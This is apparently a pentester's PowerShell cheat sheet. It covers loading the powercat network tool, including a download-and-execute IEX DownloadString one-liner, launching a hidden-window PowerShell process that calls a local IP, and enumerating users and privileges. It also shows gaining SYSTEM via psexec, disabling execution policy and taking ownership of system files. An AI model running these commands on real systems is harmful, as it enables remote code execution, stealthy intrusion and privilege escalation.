
### Load a `ps1` module:
```
Load The Function From Downloaded .ps1 File:
	. .\powercat.ps1
OR
	Import-Module .\powercat.ps1
	
Load The Function From URL:
    IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

```

### Sudo or switch user:
see [[sudo]]

```powershell
# Create a file
New-Item <filename.filetype>
echo $null >> filename.type

# To display a list of cmdlets contained in a specific module
Get-Command -Module <module name>
# example for windows defender
Get-Command -Module Defender

# help about a command
Get-Help <Command> –Full
# give examples
Get-Help <Command> -Examples

# Disable execution policy (Need admin privileges)
Set-ExecutionPolicy -ExecutionPolicy Unrestricted

# Execute a powershell command in a new process (stealthy : no window)
Start-Process "powershell" -WindowStyle Hidden -ArgumentList "curl http://192.168.0.17:8000/"
hostname
net user # list users
net user administrator # Get user info
whoami # Get current user name
whoami /groups # Get user groups
whoami /priv # Get user privileges

# Become system
psexec.exe -s -i cmd.exe # should be run as administrator

# check user right on a file
icacls.exe <file>

# take possession of a file (need admin)
takeown.exe /f <file>

# grant some right to user
icacls.exe <file> /grant <username>:<level> # example : icacls.exe C:\Windows\System32\wscript.exe /grant Administrator:F
```

